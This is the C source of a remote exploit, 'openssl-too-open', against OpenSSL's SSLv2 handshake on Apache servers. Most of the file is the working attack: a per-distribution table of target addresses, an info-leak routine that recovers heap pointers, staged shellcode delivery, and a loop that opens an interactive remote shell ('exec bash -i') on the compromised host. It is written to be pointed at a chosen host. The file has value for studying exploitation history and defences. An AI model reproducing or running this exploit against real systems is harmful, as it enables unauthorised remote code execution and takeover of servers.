/*
 * openssl-too-open.c - OpenSSL remote exploit
 * Spawns a nobody/apache shell on Apache, root on other servers.
 *
 * by Solar Eclipse <solareclipse@phreedom.org>
 *
 * Thanks to Core, HD Moore, Zillion, Dvorak and Black Berry for their help.
 *
 * This code or any derivative versions of it may not be posted to Bugtraq
 * or anywhere on SecurityFocus, Symantec or any affiliated site.
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include <errno.h>

#include "main.h"
#include "ssl2.h"

extern struct architecture arch_linux_x86;

struct system {
	char* desc;		/* description */
	struct architecture* arch;
	uint32_t func_addr;		/* objdump -R /usr/sbin/apache | grep free */
};

struct system systems[] = {
	{
		"Gentoo (apache-1.3.24-r2)",
		&arch_linux_x86,
		0x08086c34
	},
	{
		"Debian Woody GNU/Linux 3.0 (apache-1.3.26-1)",
		&arch_linux_x86,
		0x080863cc
	},
	{
		/* Black Berry */
		"Slackware 7.0 (apache-1.3.26)",
		&arch_linux_x86,
		0x083d37fc
	},
	{
		/* Black Berry */
		"Slackware 8.1-stable (apache-1.3.26)",
		&arch_linux_x86,
		0x080b2100
	},
		/* The following addresses are from H D Moore */
	{
		"RedHat Linux 6.0 (apache-1.3.6-7)",
		&arch_linux_x86,
		0x080707ec
	},
	{
		"RedHat Linux 6.1 (apache-1.3.9-4)",
		&arch_linux_x86,
		0x0808ccc4
	},
	{
		"RedHat Linux 6.2 (apache-1.3.12-2)",
		&arch_linux_x86,
		0x0808f614
	},
	{
		"RedHat Linux 7.0 (apache-1.3.12-25)",
		&arch_linux_x86,
		0x0809251c
	},
	{
		"RedHat Linux 7.1 (apache-1.3.19-5)",
		&arch_linux_x86,
		0x0809af8c
	},
	{
		"RedHat Linux 7.2 (apache-1.3.20-16)",
		&arch_linux_x86,
		0x080994d4
	},
	{
		/* Thomas Cannon */
		"Redhat Linux 7.2 (apache-1.3.26 w/PHP)",
		&arch_linux_x86,
		0x08269988
	},
	{
		/* More H D Moore */
		"RedHat Linux 7.3 (apache-1.3.23-11)",
		&arch_linux_x86,
		0x0808528c
	},
	{
		"SuSE Linux 7.0 (apache-1.3.12)",
		&arch_linux_x86,
		0x0809f54c
	},
	{
		"SuSE Linux 7.1 (apache-1.3.17)",
		&arch_linux_x86,
		0x08099984
	},
	{
		"SuSE Linux 7.2 (apache-1.3.19)",
		&arch_linux_x86,
		0x08099ec8
	},
	{
		"SuSE Linux 7.3 (apache-1.3.20)",
		&arch_linux_x86,
		0x08099da8
	},
	{
		"SuSE Linux 8.0 (apache-1.3.23-137)",
		&arch_linux_x86,
		0x080861c8
	},
	{
		"SuSE Linux 8.0 (apache-1.3.23)",
		&arch_linux_x86,
		0x08086168
	},
	{
		"Mandrake Linux 7.1 (apache-1.3.14-2)",
		&arch_linux_x86,
		0x0809f6c4
	},
	{
		"Mandrake Linux 8.0 (apache-1.3.19-3)",
		&arch_linux_x86,
		0x0809ea98
	},
	{
		"Mandrake Linux 8.1 (apache-1.3.20-3)",
		&arch_linux_x86,
		0x0809e97c
	},
	{
		"Mandrake Linux 8.2 (apache-1.3.23-4)",
		&arch_linux_x86,
		0x08086580
	}/*,
	{*/
		/* core */
/*		"Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)",
		&arch_linux_ppc,
		0xfd42630 *//* &__free_hook (this is what we meant!@) */
	/*}*/
};

#define MAX_SYSTEMS (sizeof(systems)/sizeof(struct system) - 1)

#define MAX_CONNS	255
int conn[MAX_CONNS];
int conn_count;
int max_conns;

#define MAX_SSL_CONNS 4
struct ssl_conn* ssl_conns[MAX_SSL_CONNS];

/* commands run automatically by the shell */

#define COMMAND1 "TERM=xterm; export TERM=xterm; exec bash -i\n"
#define COMMAND2 "uname -a; id; w;\n"

/* mixter's code w/enhancements by core */
int sh(int sockfd) {
	char snd[1024], rcv[1024];
	fd_set rset;
	int maxfd, n;
	int received = 0;

	/* Priming commands */
	strcpy(snd, COMMAND1 "\n");
	write(sockfd, snd, strlen(snd));

	strcpy(snd, COMMAND2 "\n");
	write(sockfd, snd, strlen(snd));

	/* Main command loop */
	for (;;) {
		FD_SET(fileno(stdin), &rset);
		FD_SET(sockfd, &rset);

		maxfd = ( ( fileno(stdin) > sockfd )?fileno(stdin):sockfd ) + 1;
		select(maxfd, &rset, NULL, NULL, NULL);

		if (FD_ISSET(fileno(stdin), &rset)) {
			bzero(snd, sizeof(snd));
			fgets(snd, sizeof(snd)-2, stdin);
			write(sockfd, snd, strlen(snd));
		}
      
		if (FD_ISSET(sockfd, &rset)) {
			bzero(rcv, sizeof(rcv));
		
			if ((n = read(sockfd, rcv, sizeof(rcv))) == -1) {
				printf("Error in read: %s\n", strerror(errno));
				exit(1);
			}

			if (!n) {
				if (!received) {
					printf("Stage2 shellcode failed.\n\n");
					return 0;
				}
				printf("Connection closed.\n");
				exit(1);
			}
			
			received = 1;
			
			fputs(rcv, stdout);
			fflush(stdout); /* keeps output nice */
		}
	} /* for(;;) */
}


/* Uses the OpenSSL info-leak to get the values of the cipher and ciphers
   variables from the SSL_SESSION structure. */
int info_leak(struct ssl_conn* ssl, struct architecture* arch)
{
	unsigned char buf[BUFSIZE];
	int len;

	send_client_hello(ssl);
	get_server_hello(ssl);
	send_client_master_key(ssl, arch->overwrite_session_id_length, arch->overwrite_session_id_length_len);
	generate_session_keys(ssl);
	get_server_verify(ssl);
	send_client_finished(ssl);
	len = get_server_finished(ssl, buf, BUFSIZE);

	if (ssl->err) {
		printf("%s\n", ssl->err_buf);
		exit(1);
	}

	ssl->cipher = arch->get_cipher(buf, len);
	ssl->ciphers = arch->get_ciphers(buf, len);

	return 1;
}

/* Sends the stage1 and stage2 shellcode to the server */
int send_shellcode(struct ssl_conn* ssl, struct system* sys, uint32_t cipher, uint32_t ciphers)
{
	unsigned char buf[BUFSIZE];
	int len, i;
	int port;

	printf(": Sending shellcode\n");

	port = get_local_port(ssl->sock);
	
#ifdef EXPLOIT_DEBUG
	printf("local port %d\n", port);
	getchar();
#endif
	
	send_client_hello(ssl);
	get_server_hello(ssl);
	
	len = sys->arch->build_shellcode(buf, BUFSIZE, port, cipher, ciphers, sys->func_addr);
	send_client_master_key(ssl, buf, len);

	generate_session_keys(ssl);
	get_server_verify(ssl);

	/* overwrite the connection id with random bytes, causing the
	   server to abort the connection */
	for (i = 0; i < ssl->conn_id_length; i++) {
		ssl->conn_id[i] = (unsigned char) (rand() >> 24);
	}
	send_client_finished(ssl);

	get_server_error(ssl);

	if (ssl->err) {
		printf("%s\n\n", ssl->err_buf);
		exit(1);
	}

	write(ssl->sock, sys->arch->tag, sys->arch->tag_len);

	if ((len = read(ssl->sock, buf, 3)) < 0) {
		printf("Error in read: %s\n", strerror(errno));
		exit(1);
	}

	if (!len) {
		printf("Connection closed after SSL_SESSION_free, possible server crash due to\n");
		printf("an unsupporeted architecture, a problem with the stage1 shellcode\n");
		printf("or a miscalculated address.\n\n");
		return 0;
	}

	if (len != 3) {
		printf("Less than 4 bytes read from stage1. This was not supposed to happen\n\n");
		return 0;
	}


	if (memcmp(buf, sys->arch->tag, sys->arch->tag_len)) {
		printf("Tags don't match. This was not supposed to happen.\n\n");
		printf("stage1 tag: %02x %02x %02x %02x\n", buf[0], buf[1], buf[2], buf[3]);
		return 0;
	}

	/* The shellcode worked, close all unnecessary open connections */
	for (i=0; i<conn_count; i++)
		close(conn[i]);

	for(i=0; i<MAX_SSL_CONNS; i++)
		if (ssl_conns[i] && ssl_conns[i] != ssl) ssl_close(ssl_conns[i]);

	printf("  Execution of stage1 shellcode succeeded, sending stage2\n");
#ifdef EXPLOIT_DEBUG
	getchar();
/*	send(ssl->sock, "\x90\x90\x90\x90", 4, 0);
	getchar();*/
#endif
	send(ssl->sock, sys->arch->shellcode_stage2, sys->arch->shellcode_stage2_len, 0);

	printf("  Spawning shell...\n\n");
	sleep(2);

	return sh(ssl->sock);
}


void usage(char* argv0)
{
	int i;

	printf("Usage: %s [options] <host>\n", argv0);
	printf("  -a <arch>          target architecture (default is 0x00)\n");
	printf("  -p <port>          SSL port (default is 443)\n");
	printf("  -c <N>             open N apache connections before sending the shellcode (default is 30)\n");
	printf("  -m <N>             maximum number of open connections (default is 50)\n");
	printf("  -v                 verbose mode\n\n");
	printf("Supported architectures:\n");
	for (i=0; i<=MAX_SYSTEMS; i++) {
		printf("\t0x%02x - %s\n", i, systems[i].desc);
	}
	printf("\n");
	printf("Examples: %s -a 0x01 -v localhost\n", argv0);
	printf("          %s -p 1234 192.168.0.1 -c 40 -m 80\n\n", argv0);

	exit(1);
}


/* run, code, run */
int main(int argc, char* argv[])
{
	struct system* sys;
	struct hostent* hp;
	in_addr_t host;
	int port;
	int verbose;

	int i, a, arg, match;

	/* set default values */
	port = 443;
	verbose = 0;
	conn_count = 30;
	max_conns = 50;
	sys = &systems[0x00];
	
	printf(": openssl-too-open : OpenSSL remote exploit\n");
	printf("  by Solar Eclipse <solareclipse@phreedom.org>\n");
	printf("\n");

	/* parse the options */
	while ((arg = getopt(argc, argv, "a:c:m:p:v")) != EOF) {
		switch (arg) {
			case 'a' :	if (!sscanf(optarg, "0x%x", &a) || (a < 0) || (a > MAX_SYSTEMS))
							usage(argv[0]);
						sys = &systems[a];
						break;
			case 'c' :	conn_count = atoi(optarg);
						if (conn_count >= MAX_CONNS) {
							printf("Can't open more than %d connections\n", MAX_CONNS);
							exit(1);
						}
						break;
			case 'm' :	max_conns = atoi(optarg);
						if (max_conns >= MAX_CONNS) {
							printf("Can't open more than %d connections\n", MAX_CONNS);
							exit(1);
						}
						if (max_conns < conn_count) {
							printf("The -m parameter should be larger than the -c parameter.\n");
							exit(1);
						}
						break;
			case 'p' :	port = atoi(optarg);
						break;
			case 'v' :	verbose++;
						break;
			case '?' :	usage(argv[0]);
						break;
		}
	}

	if (optind >= argc) {
		/* no host specified on the command line */
		usage(argv[0]);
	}

	/* resolve host */
	if (!(hp = gethostbyname(argv[optind]))) {
		printf("Unable to resolve address %s\n", argv[optind]);
		exit(1);
	}

	/* we can't handle more than one ip address */
	if (hp->h_addr_list[1]) {
		printf("%s has multiple IP addresses, please  select one of them\n", argv[optind]);
		for (i=0; hp->h_addr_list[i]; i++)
			printf("%s\n", inet_ntoa(*(struct in_addr*)&hp->h_addr_list[i]));
		exit(1);
	}

	host = *(in_addr_t*)hp->h_addr_list[0];

	optind++;
	
	if (optind < argc) {
		usage(argv[0]);
	}
	
	srand(0x31337);
	
	/* Open N connections before sending the shellcode. Hopefully this will
	   use up all available apache children and the shellcode will be handled
	   by a freshly spawned one */

	if (conn_count) printf(": Opening %d connections\n", conn_count);
	for (i=0; i<conn_count; i++) {
		conn[i] = connect_host(host, port);
		/* usleep(10000); */
	}

	while(1) {
		printf("  Establishing SSL connections\n\n");
		for (i=0; i<MAX_SSL_CONNS; i++) {
			ssl_conns[i] = ssl_connect_host(host, port, verbose);
			/* usleep(10000); */
		}
		
		/* Use the first SSL connection to overwrite session_id_length, and read
		the session structure contents from the SERVER_FINISHED packet. We need
		the cipher and ciphers variables from the session structure to make the
		shellcode work */

		printf(": Using the OpenSSL info leak to retrieve the addresses\n");
		for (i=0; i<MAX_SSL_CONNS-1; i++) {
			info_leak(ssl_conns[i], sys->arch);
			printf("  ssl%d : 0x%x\n", i, ssl_conns[i]->ciphers);
		}
		printf("\n");

		/* The ssl[3] connection uses the ciphers value to get the shellcode
		address and sends the shellcode to server */

		match = 1;
		for (i=1; i<MAX_SSL_CONNS-1; i++) {
			if (ssl_conns[i-1]->ciphers != ssl_conns[i]->ciphers) match = 0;
		}

		if (!match) {
			printf("* Addresses don't match.\n\n");
		}
		else {
			if (send_shellcode(ssl_conns[MAX_SSL_CONNS-1], sys, ssl_conns[0]->cipher, ssl_conns[0]->ciphers)) {
				printf("* Connection closed.\n");
				exit(0);
			}
			else {
				printf("* Shellcode failed.\n\n");
				exit(0);
			}
		}

		/* Close the SSL connections */
		for (i=0; i<MAX_SSL_CONNS; i++)
			if (ssl_conns[i]) ssl_close(ssl_conns[i]);

		if (!max_conns)
			exit(0);

		if (conn_count+10 > max_conns) {
			printf("Connections limit reached. Could not exploit host.\n");
			exit(0);
		}
		
		usleep(500000);

		printf(": Opening %d connections\n", conn_count + 10);
		for (i=0; i<10; i++) {
			conn[conn_count++] = connect_host(host, port);
			usleep(10000);
		}
	}
	
	return 0;
}

/* EOF */
